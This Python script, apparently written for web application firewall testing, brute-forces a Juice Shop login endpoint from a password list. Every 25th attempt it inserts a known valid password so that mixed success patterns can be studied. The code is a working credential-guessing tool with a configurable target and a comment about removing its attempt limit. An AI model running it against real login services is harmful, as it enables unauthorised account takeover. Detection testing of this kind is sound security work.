# Educational WAF Testing Script: Mixed Valid/Invalid Login Brute Force
# Purpose: Demonstrates brute force attacks that include some valid credentials
# Learning Goal: Shows how WAFs detect patterns where some attempts succeed
# WAF Context: Tests account enumeration detection and mixed success rate analysis
# Comparison: Unlike pure brute force (11_), this mixes invalid with valid credentials
# Usage: Learn how WAFs handle brute force attempts with partial success patterns

import requests
import json
import time

import os
from dotenv import load_dotenv
load_dotenv()

# --- Configuration ---
TARGET_URL = os.getenv("TARGET_URL")
LOGIN_ENDPOINT = "/rest/user/login"
# EMAIL = os.getenv("EMAIL_ADMIN")
PASSWORD_FILE = os.getenv("PASSWORD_FILE")
EMAIL = os.getenv("EMAIL1")
PASSWORD1 = os.getenv("PASSWORD1")


def read_passwords(file_path):
    """
    Reads passwords from a file, one password per line.
    """
    try:
        with open(file_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
        return passwords
    except FileNotFoundError:
        print(f"Error: Password file '{file_path}' not found.")
        return []

def perform_login_attempt(url, endpoint, email, password):
    """
    Attempts to log in to the specified Juice Shop endpoint.
    Returns True if login was successful, False otherwise.
    """
    full_url = url + endpoint
    headers = {
        "Content-Type": "application/json"
    }
    
    payload = {
        "email": email,
        "password": password
    }

    try:
        # Send the POST request with the JSON payload
        response = requests.post(full_url, data=json.dumps(payload), headers=headers, timeout=5)

        # Try to parse the response body as JSON
        try:
            response_json = response.json()
        except json.JSONDecodeError:
            response_json = {"message": "Response content was not valid JSON."}

        # Check for success (usually 200 OK with token)
        if response.status_code == 200 and 'token' in response_json:
            return True, response_json.get('token')
        else:
            return False, None

    except requests.exceptions.Timeout:
        return False, None
    except requests.exceptions.RequestException as e:
        return False, None
    except Exception as e:
        return False, None

if __name__ == "__main__":
    # Read passwords from file
    passwords = read_passwords(PASSWORD_FILE)
    
    if not passwords:
        print("No passwords to test. Exiting.")
        exit(1)
    
    print(f"--- Brute Force Login Attempt Started ---")
    print(f"Target URL: {TARGET_URL}{LOGIN_ENDPOINT}")
    print(f"Email: {EMAIL}")
    print(f"Total passwords to test: {len(passwords)}")
    print("=" * 60)
    
    successful_password = None
    attempt_count = 0
    
    # Loop through each password
    for password in passwords:
        attempt_count += 1

        if attempt_count % 25 == 0:
            password_to_test = PASSWORD1
            print(f"\n[INFO] Testing correct password on attempt #{attempt_count}")
        else:
            password_to_test = password
            
        is_success, token = perform_login_attempt(TARGET_URL, LOGIN_ENDPOINT, EMAIL, password_to_test)
        
        if is_success:
            print(f"\n[SUCCESS] Attempt #{attempt_count}")
            print(f"Password found: {password_to_test}")
            print(f"User Token: {token[:30]}...")
            successful_password = password_to_test
            break
        else:
            # Print progress for every 50 attempts
            if attempt_count % 50 == 0:
                print(f"Attempt #{attempt_count}: Password '{password}' - FAILED")
        
        if attempt_count == 100:
            print(f"Attempt 100 #{attempt_count}: Testing alternate credentials")
            exit(0)  # Exit after 100 attempts for demonstration purposes #NOTE just testing the first 100 passwords for demonstration purposes. Remove this exit in production.
        # Small delay to avoid overwhelming the server
        time.sleep(0.1)
    
    print("\n" + "=" * 60)
    if successful_password:
        print(f"--- Brute Force Attack SUCCESSFUL ---")
        print(f"Valid credentials found:")
        print(f"  Email: {EMAIL}")
        print(f"  Password: {successful_password}")
    else:
        print(f"--- Brute Force Attack COMPLETED ---")
        print(f"No valid password found among {attempt_count} attempts.")
